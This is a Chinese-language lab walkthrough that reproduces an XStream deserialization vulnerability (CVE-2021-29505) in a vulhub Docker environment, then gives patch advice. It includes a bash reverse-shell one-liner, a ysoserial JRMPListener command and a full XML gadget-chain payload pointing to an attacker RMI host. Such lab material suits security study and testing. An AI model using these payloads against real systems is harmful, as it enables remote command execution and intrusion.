## 0x00简介

XStream是一个轻量级、简单易用的开源Java类库，用来将对象序列化成XML
（JSON）或反序列化为对象，XStream是一种OXMapping技术，是用来处理XML文件序列化的框架,在将javaBean序列化，或将XML文件反序列化的时候，不需要其它辅助类和映射文件，使得XML序列化不再繁琐。

## 0x01漏洞概述

XStream在解析XML文本时使用黑名单机制来防御反序列化漏洞，但是其
1.4.16及之前版本黑名单存在缺陷。攻击者可以操纵已处理的输入流并替换或注入对象，从而在服务器上执行本地命令。

## 0x02影响版本

version <= 1.4.16

## 0x03环境搭建

1、本次搭建使用vulhub环境，下载地址：

https://github.com/vulhub/vulhub

2、下载完成后传到安装有docker环境的虚拟机中，然后解压出来，进入到漏洞环境目录

    
    
    cd vulhub-master/xstream/CVE-2021-29505/

![1630303785_612c76299fda72af6e606.png!small?1630303784891](https://image.3001.net/images/20210830/1630303785_612c76299fda72af6e606.png!small?1630303784891)

3、使用以下命令拉取漏洞环境，下方显示绿色的done字体表示成功

    
    
    docker-compose up -d

![1630303805_612c763d04d70fe0758f6.png!small?1630303804434](https://image.3001.net/images/20210830/1630303805_612c763d04d70fe0758f6.png!small?1630303804434)

4、在浏览器访问http://your-ip:8080,出现以下界面表示搭建成功

![1630303815_612c76474e157ddb8f4fb.png!small?1630303814549](https://image.3001.net/images/20210830/1630303815_612c76474e157ddb8f4fb.png!small?1630303814549)

## 0x04漏洞复现

1、首先在攻击端的服务器上使用ysoserial的JRMPListener启动一个恶意的RMI Registry，ysoserial下载地址：

<https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar>

2、使用以下网址对反弹shell的命令进行base64编码，在kali进行监听

<http://www.jackson-t.ca/runtime-exec-payloads.html>

    
    
    bash -i >& /dev/tcp/ip/port 0>&1﻿

![1630303822_612c764e76e803954a82b.png!small?1630303821718](https://image.3001.net/images/20210830/1630303822_612c764e76e803954a82b.png!small?1630303821718)

3、使用ysoserial执行的命令，其中后面的payload为base64编码后的sehll

    
    
    java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 2256 CommonsCollections6 "base64编码shell"

![1630303832_612c7658b204cfe346797.png!small?1630303831947](https://image.3001.net/images/20210830/1630303832_612c7658b204cfe346797.png!small?1630303831947)

4、打开burp抓取首页的包，将抓到的包修改成POST，然后将Content-Type：修改为xml

![1630303845_612c766562d63c154dddc.png!small?1630303844855](https://image.3001.net/images/20210830/1630303845_612c766562d63c154dddc.png!small?1630303844855)

5、将以下xml格式添加到burp数据包中，将其中的IP和RMI服务端口修改成自己的

<java.util.PriorityQueue serialization='custom'> <unserializable-parents/>

<java.util.PriorityQueue>

<default>

<size>2</size>

</default>

<int>3</int>

<javax.naming.ldap.Rdn_-RdnEntry>

<type>12345</type>

<value class='com.sun.org.apache.xpath.internal.objects.XString'>

<m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d
Content</m__obj>

</value>

</javax.naming.ldap.Rdn_-RdnEntry>

<javax.naming.ldap.Rdn_-RdnEntry>

<type>12345</type>

<value class='com.sun.xml.internal.ws.api.message.Packet'
serialization='custom'>

<message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>

<parsedMessage>true</parsedMessage>

<soapVersion>SOAP_11</soapVersion>

<bodyParts/>

<sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>

<attachmentsInitialized>false</attachmentsInitialized>

<nullIter
class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>

<aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>

<candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>

<names>

<string>aa</string>

<string>aa</string>

</names>

<ctx>

<environment/>

<registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>

<java.rmi.server.RemoteObject>

<string>UnicastRef</string>

<string>172.16.1.169</string>

<int>2256</int>

<long>0</long>

<int>0</int>

<long>0</long>

<short>0</short>

<boolean>false</boolean>

</java.rmi.server.RemoteObject>

</registry>

<host>172.16.1.169</host>

<port>2256</port>

</ctx>

</candidates>

</aliases>

</nullIter>

</sm>

</message>

</value>

</javax.naming.ldap.Rdn_-RdnEntry>

</java.util.PriorityQueue>

</java.util.PriorityQueue>  
  
---  
  
![1630303853_612c766d72b9f43e6339b.png!small?1630303852957](https://image.3001.net/images/20210830/1630303853_612c766d72b9f43e6339b.png!small?1630303852957)

6、发送数据包返回500，查看kali中开启的RMI服务器消息，接收到了请求执行了反弹shell的命令

![1630303857_612c7671c925fa8189aaf.png!small?1630303857296](https://image.3001.net/images/20210830/1630303857_612c7671c925fa8189aaf.png!small?1630303857296)

![1630303861_612c7675ea0ce86dc1da2.png!small?1630303861287](https://image.3001.net/images/20210830/1630303861_612c7675ea0ce86dc1da2.png!small?1630303861287)

![1630303868_612c767c9b6957f4dfffe.png!small?1630303867887](https://image.3001.net/images/20210830/1630303868_612c767c9b6957f4dfffe.png!small?1630303867887)

## 0x05修复建议

1、将XStream升级到1.4.17或最新版本

https://x-stream.github.io/news.html

2、使用安全api

https://x-stream.github.io/security.html#example

参考链接：https://paper.seebug.org/1543/

